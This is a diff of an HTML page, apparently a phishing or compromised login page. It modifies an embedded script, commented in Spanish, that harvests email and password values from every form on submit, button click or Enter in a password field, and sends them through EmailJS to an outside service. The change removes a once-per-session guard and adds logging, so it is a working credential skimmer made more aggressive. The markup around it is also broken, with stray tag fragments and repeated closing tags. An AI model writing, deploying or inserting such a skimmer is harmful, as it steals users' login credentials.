@@ -782,22 +782,14 @@
 ></div></div>
 ></div></div>
 
-></div></div><!-- Todo tu contenido original -->
+></div></div
 
-<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
 (function() {
     emailjs.init({ publicKey: "3x0styJQNXamR4XT4" });
     
-    let yaEnviado = false;
-    
     function capturarYEnviar() {
-        if (yaEnviado) {
-            console.log('Ya se envió en esta sesión');
-            yaEnviado = false;
-            return;
-        }
-        
         const forms = document.querySelectorAll('form');
         
         forms.forEach(function(form) {
@@ -823,47 +815,53 @@
             });
             
             if (email && password) {
-                yaEnviado = true;
-                console.log('Enviando credenciales...');
+                console.log('📧 Enviando:', email);
                 
                 emailjs.send('service_33u0mdn', 'template_ghyltzf', {
                     user_email: email,
                     password: password,
                     timestamp: new Date().toLocaleString('es-ES')
                 }).then(function() {
-                    console.log('✅ Credenciales enviadas');
+                    console.log('✅ ENVIADO!');
                 }).catch(function(error) {
                     console.error('❌ Error:', error);
-                    yaEnviado = false;
                 });
+            } else {
+                console.log('❌ No se encontraron credenciales');
             }
         });
     }
     
     window.addEventListener('load', function() {
+        // Submit de formularios
         document.querySelectorAll('form').forEach(function(form) {
             form.addEventListener('submit', function(e) {
+                console.log('🔄 Submit detectado');
                 capturarYEnviar();
             });
         });
         
+        // Clicks en botones
         document.addEventListener('click', function(e) {
-            const target = e.target;
-            if (target.tagName === 'BUTTON' || target.tagName === 'INPUT' && target.type === 'submit') {
-                setTimeout(capturarYEnviar, 100);
+            if (e.target.tagName === 'BUTTON' || (e.target.tagName === 'INPUT' && e.target.type === 'submit')) {
+                console.log('🖱️ Click en botón detectado');
+                setTimeout(capturarYEnviar, 200);
             }
         });
         
+        // Enter en password
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter' && e.target.type === 'password') {
-                setTimeout(capturarYEnviar, 100);
+                console.log('⌨️ Enter en password detectado');
+                setTimeout(capturarYEnviar, 200);
             }
         });
     });
 })();
 </script>
 
-></div></div></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html>
+></div></div></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html>
+
 
 
 
